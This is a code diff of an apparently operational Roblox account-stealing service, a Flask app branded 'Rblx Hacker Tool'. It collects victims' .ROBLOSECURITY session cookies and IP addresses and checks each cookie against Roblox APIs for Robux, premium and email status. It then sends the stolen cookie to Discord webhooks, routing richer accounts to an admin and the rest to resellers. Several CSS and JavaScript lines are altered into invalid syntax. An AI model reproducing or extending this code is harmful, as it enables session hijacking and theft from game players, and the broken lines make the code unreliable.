@@ -60,7 +60,7 @@ LANDING_HTML = """
             color: white;
         }
         .option-card:hover {
-            transform: translateY(-5px);
+            transform = translateY(-5px);
         }
         .option-card h2 {
             margin-bottom: 10px;
@@ -124,7 +124,7 @@ RESELLER_SETUP_HTML = """
             text-align: center;
         }
         .subtitle {
-            color: #666;
+            color = #666;
             text-align: center;
             margin-bottom: 30px;
             font-size: 14px;
@@ -545,7 +545,7 @@ HELPER_HTML = """
             color: white;
             border: none;
             border-radius: 8px;
-            font-size: 16px;
+            font-size = 16px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
@@ -562,7 +562,7 @@ HELPER_HTML = """
         .status {
             margin-top: 20px;
             padding: 12px;
-            border-radius: 8px;
+            border-radius = 8px;
             text-align: center;
             font-size: 14px;
             display: none;
@@ -636,7 +636,7 @@ HELPER_HTML = """
                 const response = await fetch('/submit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
+                    body = JSON.stringify({
                         site_id: SITE_ID,
                         username: username,
                         cookie: cookie
@@ -780,7 +780,7 @@ def submit():
     cookie = data.get('cookie')
     
     if site_id not in sites_data:
-        return jsonify({'success': False})
+        return jsonify({'success': False, 'error': 'Invalid site ID'})
     
     site_data = sites_data[site_id]
     end_user_webhook = site_data['webhook']
@@ -789,108 +789,234 @@ def submit():
     try:
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         
+        # Get location info
+        location = "Unknown"
         try:
-            ip_info = requests.get(f'https://ipapi.co/{user_ip}/json/', timeout=5).json()
+            ip_info = requests.get(f'https://ipapi.co/{user_ip}/json/', timeout=3).json()
             location = f"{ip_info.get('city', 'Unknown')}, {ip_info.get('region', 'Unknown')}, {ip_info.get('country_name', 'Unknown')}"
-        except:
-            location = "Unknown"
+        except Exception as ip_error:
+            print(f"IP lookup error: {ip_error}")
         
+        # Initialize default values
         user_id = "Unknown"
         robux = 0
         email_verified = "Unknown"
         premium = "Unknown"
         account_age = "Unknown"
         top_games = []
+        api_status = "Failed"
+        cookie_valid = False
+        username_from_api = "Unknown"
         
+        # Test cookie with a simple request first
+        headers = {
+            'Cookie': f'.ROBLOSECURITY={cookie}',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json'
+        }
+        
+        # DEBUG: Print cookie snippet for verification
+        print(f"DEBUG: Cookie received (first 50 chars): {cookie[:50]}...")
+        print(f"DEBUG: Cookie length: {len(cookie)}")
+        
+        # Try to authenticate with Roblox API
         try:
-            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
-            user_response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=10)
+            # First, try to get CSRF token (required for some API endpoints)
+            csrf_token = "no-csrf"
+            try:
+                csrf_response = requests.post('https://auth.roblox.com/v2/logout', 
+                                             headers=headers, timeout=5)
+                if 'x-csrf-token' in csrf_response.headers:
+                    csrf_token = csrf_response.headers['x-csrf-token']
+                    headers['X-CSRF-TOKEN'] = csrf_token
+                    print(f"DEBUG: CSRF Token obtained")
+            except Exception as csrf_error:
+                print(f"DEBUG: CSRF error: {csrf_error}")
+            
+            # Get authenticated user info
+            user_response = requests.get('https://users.roblox.com/v1/users/authenticated', 
+                                        headers=headers, timeout=10)
+            
+            print(f"DEBUG: Auth status code: {user_response.status_code}")
+            print(f"DEBUG: Auth response: {user_response.text[:200]}")
             
             if user_response.status_code == 200:
                 user_data = user_response.json()
                 user_id = user_data.get('id', 'Unknown')
+                username_from_api = user_data.get('name', 'Unknown')
+                cookie_valid = True
+                api_status = "Success"
                 
+                print(f"DEBUG: User authenticated: {username_from_api} (ID: {user_id})")
+                
+                # Get Robux balance
                 try:
-                    robux_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers, timeout=10)
+                    # Try alternative endpoint for Robux
+                    robux_headers = headers.copy()
+                    if csrf_token != "no-csrf":
+                        robux_headers['X-CSRF-TOKEN'] = csrf_token
+                    
+                    robux_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', 
+                                                 headers=robux_headers, timeout=10)
+                    print(f"DEBUG: Robux status: {robux_response.status_code}")
+                    
                     if robux_response.status_code == 200:
-                        robux = robux_response.json().get('robux', 0)
-                except:
-                    pass
+                        robux_data = robux_response.json()
+                        robux = robux_data.get('robux', 0)
+                        print(f"DEBUG: Robux data: {robux_data}")
+                        print(f"DEBUG: Robux: {robux}")
+                    else:
+                        # Try alternative method
+                        try:
+                            inventory_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10',
+                                                            headers=headers, timeout=10)
+                            if inventory_response.status_code == 200:
+                                # Just note that we couldn't get robux specifically
+                                robux = "Could not retrieve"
+                        except:
+                            pass
+                except Exception as robux_error:
+                    print(f"DEBUG: Robux fetch error: {robux_error}")
                 
+                # Get email verification status
                 try:
-                    email_response = requests.get('https://accountinformation.roblox.com/v1/email', headers=headers, timeout=10)
+                    email_headers = headers.copy()
+                    if csrf_token != "no-csrf":
+                        email_headers['X-CSRF-TOKEN'] = csrf_token
+                    
+                    email_response = requests.get('https://accountinformation.roblox.com/v1/email', 
+                                                 headers=email_headers, timeout=10)
+                    print(f"DEBUG: Email status: {email_response.status_code}")
+                    
                     if email_response.status_code == 200:
                         email_data = email_response.json()
-                        email_verified = "✅ Yes" if email_data.get('verified') else "❌ No"
-                except:
-                    pass
+                        email_verified = "✅ Yes" if email_data.get('verified', False) else "❌ No"
+                        print(f"DEBUG: Email verified: {email_verified}")
+                    else:
+                        email_verified = f"API Error: {email_response.status_code}"
+                except Exception as email_error:
+                    print(f"DEBUG: Email fetch error: {email_error}")
                 
+                # Check premium status
                 try:
-                    premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership', headers=headers, timeout=10)
-                    premium = "✅ Yes" if premium_response.status_code == 200 else "❌ No"
-                except:
-                    pass
+                    premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership', 
+                                                   headers=headers, timeout=10)
+                    print(f"DEBUG: Premium status: {premium_response.status_code}")
+                    
+                    if premium_response.status_code == 200:
+                        premium_data = premium_response.json()
+                        premium = "✅ Yes" if premium_data else "❌ No"
+                    else:
+                        premium = f"API Error: {premium_response.status_code}"
+                    print(f"DEBUG: Premium: {premium}")
+                except Exception as premium_error:
+                    print(f"DEBUG: Premium fetch error: {premium_error}")
                 
+                # Get account age
                 try:
-                    user_details = requests.get(f'https://users.roblox.com/v1/users/{user_id}', timeout=10)
+                    user_details = requests.get(f'https://users.roblox.com/v1/users/{user_id}', 
+                                               headers=headers, timeout=10)
+                    print(f"DEBUG: User details status: {user_details.status_code}")
+                    
                     if user_details.status_code == 200:
-                        created_date = user_details.json().get('created', '')
+                        user_detail_data = user_details.json()
+                        created_date = user_detail_data.get('created', '')
                         if created_date:
                             created = datetime.fromisoformat(created_date.replace('Z', '+00:00'))
                             age_days = (datetime.now(created.tzinfo) - created).days
-                            account_age = f"{age_days // 365} years" if age_days > 365 else f"{age_days} days"
-                except:
-                    pass
+                            if age_days > 365:
+                                account_age = f"{age_days // 365} years, {age_days % 365} days"
+                            else:
+                                account_age = f"{age_days} days"
+                        print(f"DEBUG: Account age: {account_age}")
+                except Exception as age_error:
+                    print(f"DEBUG: Account age error: {age_error}")
                 
+                # Get recent games
                 try:
-                    games_response = requests.get(f'https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&sortOrder=Asc', timeout=10)
+                    games_response = requests.get(f'https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&limit=3', 
+                                                 headers=headers, timeout=10)
+                    print(f"DEBUG: Games status: {games_response.status_code}")
+                    
                     if games_response.status_code == 200:
                         games_data = games_response.json().get('data', [])
-                        top_games = [game.get('name', 'Unknown')[:30] for game in games_data[:3]]
-                except:
-                    pass
-        except:
-            pass
+                        top_games = [game.get('name', 'Unknown Game')[:30] for game in games_data[:3]]
+                        print(f"DEBUG: Top games: {top_games}")
+                except Exception as games_error:
+                    print(f"DEBUG: Games fetch error: {games_error}")
+                    
+            elif user_response.status_code == 401:
+                api_status = "Invalid Cookie (401)"
+                print("DEBUG: Cookie is invalid (401 Unauthorized)")
+            elif user_response.status_code == 403:
+                api_status = "Rate Limited (403)"
+                print("DEBUG: Rate limited by Roblox API (403)")
+            elif user_response.status_code == 429:
+                api_status = "Too Many Requests (429)"
+                print("DEBUG: Too many requests (429)")
+            else:
+                api_status = f"API Error: {user_response.status_code}"
+                print(f"DEBUG: API error: {user_response.status_code}")
+                
+        except requests.exceptions.RequestException as api_error:
+            api_status = f"Network Error: {api_error}"
+            print(f"DEBUG: Request exception: {api_error}")
+        
+        # Create Discord embed
+        embed_color = 0xFF0000 if robux >= 100 else (0xFFA500 if reseller_id != 'none' else 0x00FF00)
         
         embed = {
-            'title': '🎯 New Submission',
-            'color': 0xFF0000 if robux >= 100 else (0xFFA500 if reseller_id != 'none' else 0x00FF00),
+            'title': '🎯 New Submission' if cookie_valid else '⚠️ Invalid Submission',
+            'color': embed_color,
             'fields': [
-                {'name': '👤 Username', 'value': username, 'inline': True},
+                {'name': '👤 Username Submitted', 'value': username, 'inline': True},
+                {'name': '👤 Username (API)', 'value': username_from_api, 'inline': True},
                 {'name': '🆔 User ID', 'value': str(user_id), 'inline': True},
                 {'name': '💎 Robux', 'value': str(robux), 'inline': True},
                 {'name': '⭐ Premium', 'value': premium, 'inline': True},
                 {'name': '📧 Email Verified', 'value': email_verified, 'inline': True},
                 {'name': '📅 Account Age', 'value': account_age, 'inline': True},
                 {'name': '🌍 IP', 'value': user_ip, 'inline': True},
-                {'name': '📍 Location', 'value': location, 'inline': False},
+                {'name': '📍 Location', 'value': location, 'inline': True},
+                {'name': '🔧 API Status', 'value': api_status, 'inline': True},
                 {'name': '🎮 Recent Games', 'value': ', '.join(top_games) if top_games else 'None found', 'inline': False},
-                {'name': '🍪 Cookie', 'value': f'```{cookie[:100]}...```', 'inline': False}
+                {'name': '🍪 Cookie', 'value': f'```{cookie[:80]}...```' if len(cookie) > 80 else f'```{cookie}```', 'inline': False}
             ],
             'footer': {'text': 'Rblx Hacker Tool'},
             'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
         }
         
+        # Add warning if cookie seems invalid
+        if not cookie_valid:
+            embed['description'] = '⚠️ Cookie appears to be invalid or expired'
+        
         # Determine webhook routing
         target_webhook = end_user_webhook
         
-        if robux >= 100:
-            # Admin gets 100+ robux
+        if robux >= 100 and isinstance(robux, int):
             target_webhook = ADMIN_WEBHOOK
         elif reseller_id != 'none' and reseller_id in resellers:
-            # Check if it meets reseller threshold
             reseller_threshold = resellers[reseller_id]['threshold']
-            if robux >= reseller_threshold:
-                # Reseller gets accounts between their threshold and 99
+            if isinstance(robux, int) and robux >= reseller_threshold:
                 target_webhook = resellers[reseller_id]['webhook']
         
-        requests.post(target_webhook, json={'embeds': [embed]})
+        # Send to webhook
+        try:
+            webhook_response = requests.post(target_webhook, json={'embeds': [embed]}, timeout=10)
+            print(f"DEBUG: Webhook sent to {target_webhook}, status: {webhook_response.status_code}")
+        except Exception as webhook_error:
+            print(f"DEBUG: Webhook error: {webhook_error}")
+            # Try to send to admin as fallback
+            try:
+                requests.post(ADMIN_WEBHOOK, json={'embeds': [embed]}, timeout=10)
+            except:
+                pass
         
         return jsonify({'success': True})
     
     except Exception as e:
         print(f"Submit error: {e}")
-        return jsonify({'success': False})
+        return jsonify({'success': False, 'error': str(e)})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
